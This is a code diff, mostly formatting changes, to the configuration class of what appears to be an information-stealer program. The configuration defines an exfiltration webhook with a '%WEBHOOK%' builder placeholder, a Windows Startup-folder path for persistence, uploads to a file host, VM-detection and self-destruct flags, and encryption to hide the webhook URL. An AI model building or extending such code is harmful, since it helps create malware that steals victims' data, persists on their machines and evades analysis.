@@ -16,33 +16,43 @@ class Config {
                 version: process.env.APP_VERSION || '1.0.0',
                 environment: process.env.NODE_ENV || 'development'
             },
-            
+
             // Webhook configuration
             webhook: {
                 url: process.env.WEBHOOK_URL || '%WEBHOOK%',
                 timeout: parseInt(process.env.WEBHOOK_TIMEOUT) || 30000
             },
-            
+
             // File paths
             paths: {
-                temp: process.env.TEMP_PATH || path.join(process.env.LOCALAPPDATA || '/tmp', 'Temp'),
-                startup: process.env.STARTUP_PATH || path.join(process.env.APPDATA || '/tmp', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                temp:
+                    process.env.TEMP_PATH || path.join(process.env.LOCALAPPDATA || '/tmp', 'Temp'),
+                startup:
+                    process.env.STARTUP_PATH ||
+                    path.join(
+                        process.env.APPDATA || '/tmp',
+                        'Microsoft',
+                        'Windows',
+                        'Start Menu',
+                        'Programs',
+                        'Startup'
+                    ),
                 output: process.env.OUTPUT_PATH || './output'
             },
-            
+
             // Upload settings
             upload: {
                 maxSize: parseInt(process.env.MAX_UPLOAD_SIZE) || 7 * 1024 * 1024, // 7MB
                 service: process.env.UPLOAD_SERVICE || 'gofile',
                 enabled: process.env.UPLOAD_ENABLED !== 'false'
             },
-            
+
             // Security settings
             security: {
                 enableVmDetection: process.env.ENABLE_VM_DETECTION === 'true',
                 enableSelfDestruct: process.env.ENABLE_SELF_DESTRUCT === 'true'
             },
-            
+
             // Module settings
             modules: {
                 enabled: {
@@ -66,7 +76,7 @@ class Config {
     get(path, defaultValue = null) {
         const keys = path.split('.');
         let value = this.config;
-        
+
         for (const key of keys) {
             if (value && typeof value === 'object' && key in value) {
                 value = value[key];
@@ -74,7 +84,7 @@ class Config {
                 return defaultValue;
             }
         }
-        
+
         // Automatically decrypt webhook URLs when retrieved (if they are encrypted)
         if (path === 'webhook.url' && typeof value === 'string') {
             // Only decrypt if the value appears to be encrypted
@@ -84,7 +94,7 @@ class Config {
             // Return as-is if not encrypted (plain text URL)
             return value;
         }
-        
+
         return value;
     }
 
@@ -97,14 +107,14 @@ class Config {
         const keys = path.split('.');
         const lastKey = keys.pop();
         let current = this.config;
-        
+
         for (const key of keys) {
             if (!(key in current) || typeof current[key] !== 'object') {
                 current[key] = {};
             }
             current = current[key];
         }
-        
+
         // Note: Removed automatic encryption for webhook URLs
         // URLs are stored as-is in the configuration
         // Decryption only happens at runtime when accessed via get()
@@ -120,7 +130,7 @@ class Config {
             if (fs.existsSync(filePath)) {
                 const fileConfig = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                 this.config = { ...this.config, ...fileConfig };
-                
+
                 // Note: Removed automatic encryption of webhook URL in config file
                 // The URL will remain in its original format in the config.json file
                 // Decryption still happens at runtime when the URL is accessed via get()
@@ -151,11 +161,7 @@ class Config {
      * @returns {boolean} True if configuration is valid
      */
     validate() {
-        const required = [
-            'app.name',
-            'webhook.url',
-            'paths.temp'
-        ];
+        const required = ['app.name', 'webhook.url', 'paths.temp'];
 
         for (const path of required) {
             if (this.get(path) === null) {
@@ -184,7 +190,7 @@ class Config {
                 this.config.webhook.url = encryptedUrl;
                 console.log('Webhook URL encrypted successfully');
             }
-            
+
             return true;
         } catch (error) {
             console.error('Failed to encrypt webhook URL:', error.message);
@@ -213,14 +219,14 @@ class Config {
             const encryptedUrl = encryptionUtils.encryptWebhook(currentUrl);
             if (encryptedUrl !== currentUrl) {
                 this.config.webhook.url = encryptedUrl;
-                
+
                 // Save the updated configuration back to file
                 this.saveToFile(filePath);
-                
+
                 console.log('Webhook URL automatically encrypted and saved to configuration');
                 return true;
             }
-            
+
             return true;
         } catch (error) {
             console.error('Failed to automatically encrypt webhook URL:', error.message);
